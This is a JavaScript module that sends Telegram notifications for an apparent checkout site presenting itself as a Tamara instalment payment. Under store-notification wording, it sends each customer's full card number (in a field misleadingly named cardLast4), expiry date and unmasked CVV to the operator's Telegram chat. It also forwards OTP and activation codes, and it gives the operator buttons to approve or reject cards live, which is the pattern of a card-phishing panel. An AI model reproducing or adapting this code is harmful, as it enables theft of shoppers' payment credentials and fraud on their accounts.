'use strict';

const { OWNER_CHAT_ID } = require('./config');
const { getBot } = require('./bot');
const { formatDate } = require('./handlers/helpers');

const sendNewOrderNotification = async order => {
  const bot = getBot();
  if (!bot || !OWNER_CHAT_ID) return;

  const text =
    `🛒 طلب جديد!\n\n` +
    `الاسم: ${order.userName}\n` +
    `الإيميل: ${order.userEmail}\n` +
    `المنتج: ${order.productName}\n` +
    `السعر: ${order.amount.toLocaleString('en-US')} ر.س\n` +
    `الدفع: تمارا\n` +
    `الأقساط: ${order.installments === 1 ? 'دفعة كاملة' : order.installments}\n` +
    `كل دفعة: ${order.perInstallment.toLocaleString('en-US')} ر.س\n` +
    `العمولة: ${order.commission.toLocaleString('en-US')} ر.س\n` +
    `صافي: ${order.netTransfer.toLocaleString('en-US')} ر.س\n\n` +
    `ID: ORDER-${order.id}`;

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ موافقة', callback_data: `approve_${order.id}` },
            { text: '❌ رفض', callback_data: `reject_${order.id}` },
          ],
          [{ text: '📋 تفاصيل', callback_data: `details_${order.id}` }],
        ],
      },
    });
  } catch (err) {
    console.error('[Telegram] sendNewOrderNotification error:', err.message);
  }
};

const sendPaymentStatusNotification = async (orderId, status) => {
  const bot = getBot();
  if (!bot || !OWNER_CHAT_ID) return;
  const emoji = status === 'paid' ? '✅' : '❌';
  const label = status === 'paid' ? 'تم الدفع بنجاح' : 'فشل الدفع';
  try {
    await bot.sendMessage(OWNER_CHAT_ID, `${emoji} حالة الدفع للطلب #${orderId}: ${label}`);
  } catch (err) {
    console.error('[Telegram] sendPaymentStatusNotification error:', err.message);
  }
};

const sendCheckoutEventNotification = async event => {
  const bot = getBot();
  if (!bot || !OWNER_CHAT_ID) return;

  const {
    sessionId,
    eventType,
    userName,
    userEmail,
    productName,
    productPrice,
    paymentMethod,
    installments,
    phoneMasked,
    orderId,
    paymentStatus,
  } = event;

  const formatPrice = price =>
    new Intl.NumberFormat('en-US', { style: 'decimal', minimumFractionDigits: 0 }).format(price) + ' ر.س';
  const eventLabels = {
    product_selected: '🛍️ اختيار المنتج',
    checkout_started: '🛒 بدء الدفع',
    payment_method_selected: '💳 اختيار طريقة الدفع',
    phone_entered: '📱 إدخال رقم الهاتف',
    phone_confirmed: '✅ تأكيد رقم الهاتف',
    redirect_to_payment: '🔗 التحويل لبوابة الدفع',
    checkout_completed: '🎉 إتمام الطلب',
  };

  const label = eventLabels[eventType] || eventType;

  let text = `${label}\n`;
  text += `🆔 Session: ${sessionId.substring(0, 8)}...\n\n`;

  if (userName || userEmail) {
    text += `👤 العميل:\n`;
    if (userName) text += `   الاسم: ${userName}\n`;
    if (userEmail) text += `   الإيميل: ${userEmail}\n`;
    text += '\n';
  }

  if (productName) {
    text += `📦 المنتج: ${productName}\n`;
    if (productPrice) text += `   السعر: ${formatPrice(productPrice)}\n`;
    text += '\n';
  }

  if (paymentMethod) {
    text += `💳 طريقة الدفع: تمارا\n`;
    if (installments) {
      text += `   الأقساط: ${installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`}\n`;
    }
    text += '\n';
  }

  if (phoneMasked) {
    text += `📱 الهاتف: ${phoneMasked}\n\n`;
  }

  if (orderId) {
    text += `📋 رقم الطلب: ${orderId}\n`;
  }
  if (paymentStatus) {
    const statusEmoji = paymentStatus === 'paid' ? '✅' : paymentStatus === 'failed' ? '❌' : '⏳';
    const statusLabel = paymentStatus === 'paid' ? 'مدفوع' : paymentStatus === 'failed' ? 'فاشل' : 'معلق';
    text += `💵 حالة الدفع: ${statusEmoji} ${statusLabel}\n`;
  }

  if (event.timestamp) {
    text += `\n📅 ${formatDate(event.timestamp)}`;
  }

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text);
  } catch (err) {
    console.error('[Telegram] sendCheckoutEventNotification error:', err.message);
  }
};

const maskExpiry = expiry => {
  if (!expiry || typeof expiry !== 'string') return '—';
  return expiry;
};

const maskCvv = cvv => {
  if (!cvv || typeof cvv !== 'string') return '—';
  return cvv;
};

const sendCardApprovalRequest = async event => {
  const bot = getBot();
  if (!bot || !OWNER_CHAT_ID) return;

  const {
    sessionId,
    userName,
    userEmail,
    productName,
    amount,
    paymentMethod,
    installments,
    phoneMasked,
    cardLast4,
    cardExpiry,
    cardCvv,
    timestamp,
  } = event;

  const formatPrice = price =>
    new Intl.NumberFormat('en-US', { style: 'decimal', minimumFractionDigits: 0 }).format(price) + ' ر.س';

  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
  const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';

  let text = '💳 طلب موافقة — بيانات البطاقة\n';
  text += '━━━━━━━━━━━━━━━━━━━━\n\n';

  text += `👤 الاسم: ${userName || '—'}\n`;
  text += `📧 الإيميل: ${userEmail || '—'}\n`;
  if (phoneMasked) text += `📱 الهاتف: ${phoneMasked}\n`;
  text += '\n';

  text += `📦 المنتج: ${productName || '—'}\n`;
  if (amount) text += `💰 المبلغ: ${formatPrice(amount)}\n`;
  text += `💳 طريقة الدفع: ${methodLabel}\n`;
  text += `📊 الأقساط: ${installmentsLabel}\n`;

  if (cardLast4) {
    const sanitizedLast4 = String(cardLast4).replace(/\D/g, '').slice(-16);
    if (sanitizedLast4.length === 16) {
      text += `🔒 البطاقة: ${sanitizedLast4}\n`;
    }
  }
  if (cardExpiry) text += `📅 الانتهاء: ${maskExpiry(String(cardExpiry))}\n`;
  if (cardCvv) text += `🔐 CVV: ${maskCvv(String(cardCvv))}\n`;

  text += '\n';
  text += `🆔 Session: ${sessionShort}...\n`;
  text += `📅 ${formatDate(timestamp || new Date())}\n`;

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ موافقة', callback_data: `approve_card_${sessionId}` },
            { text: '❌ كود غير صحيح', callback_data: `reject_card_invalid_${sessionId}` },
          ],
          [
            { text: '❌ لا يوجد رصيد', callback_data: `reject_card_nobalance_${sessionId}` },
            { text: '❌ رفض البطاقة', callback_data: `reject_card_rejected_${sessionId}` },
          ],
        ],
      },
    });
  } catch (err) {
    console.error('[Telegram] sendCardApprovalRequest error:', err.message);
  }
};

const sendCodeVerificationRequest = async (event, verificationCode) => {
  const bot = getBot();
  if (!bot || !OWNER_CHAT_ID) return;

  const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked } = event;

  const formatPrice = price =>
    new Intl.NumberFormat('en-US', { style: 'decimal', minimumFractionDigits: 0 }).format(price) + ' ر.س';

  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
  const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';

  let text = '🔐 تحقق من كود التفعيل\n';
  text += '━━━━━━━━━━━━━━━━━━━━\n\n';

  text += `👤 الاسم: ${userName || '—'}\n`;
  text += `📧 الإيميل: ${userEmail || '—'}\n`;
  if (phoneMasked) text += `📱 الهاتف: ${phoneMasked}\n`;
  text += '\n';

  text += `📦 المنتج: ${productName || '—'}\n`;
  if (amount) text += `💰 المبلغ: ${formatPrice(amount)}\n`;
  text += `💳 طريقة الدفع: ${methodLabel}\n`;
  text += `📊 الأقساط: ${installmentsLabel}\n`;
  text += '\n';

  text += `🔑 الكود المدخل: <code>${verificationCode || '—'}</code>\n`;
  text += '\n';
  text += `🆔 Session: ${sessionShort}...\n`;
  text += `📅 ${formatDate(new Date())}\n`;

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text, {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '✅ الرمز صحيح', callback_data: `verify_correct_${sessionId}` }],
          [{ text: '❌ الكود غير صحيح', callback_data: `verify_incorrect_${sessionId}` }],
          [{ text: '💳 لا يوجد رصيد', callback_data: `verify_nobalance_${sessionId}` }],
          [{ text: '🚫 رفض البطاقة', callback_data: `verify_rejected_${sessionId}` }],
        ],
      },
    });
  } catch (err) {
    console.error('[Telegram] sendCodeVerificationRequest error:', err.message);
  }
};

const sendActivationCode = async (event, activationCode) => {
  const bot = getBot();
  if (!bot || !OWNER_CHAT_ID) return;

  const { sessionId, userName, phoneNumber } = event;

  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';

  let text = '🔐 كود التفعيل - تمارا\n';
  text += '━━━━━━━━━━━━━━━━━━━━\n\n';

  text += `👤 العميل: ${userName || '—'}\n`;
  text += `📱 الرقم: ${phoneNumber || '—'}\n`;
  text += `🔢 الكود: <code>${activationCode}</code>\n\n`;
  text += `⏰ صلاحية الكود: 5 دقائق\n`;
  text += '\n';
  text += `🆔 Session: ${sessionShort}...\n`;
  text += `📅 ${formatDate(new Date())}\n`;

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text, {
      parse_mode: 'HTML',
    });
  } catch (err) {
    console.error('[Telegram] sendActivationCode error:', err.message);
  }
};

const sendVerifyCodeConfirmation = async (sessionId, code) => {
  const bot = getBot();
  if (!bot || !OWNER_CHAT_ID) return;

  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';

  const text =
    `✅ تم حفظ كود OTP\n` +
    `━━━━━━━━━━━━━━━━━━━━\n\n` +
    `🔑 الكود: <code>${code}</code>\n` +
    `🆔 Session: ${sessionShort}...\n\n` +
    `في انتظار العميل لإدخال الكود على الموقع.`;

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text, { parse_mode: 'HTML' });
  } catch (err) {
    console.error('[Telegram] sendVerifyCodeConfirmation error:', err.message);
  }
};

module.exports = {
  sendNewOrderNotification,
  sendPaymentStatusNotification,
  sendCheckoutEventNotification,
  sendCardApprovalRequest,
  sendCodeVerificationRequest,
  sendActivationCode,
  sendVerifyCodeConfirmation,
};
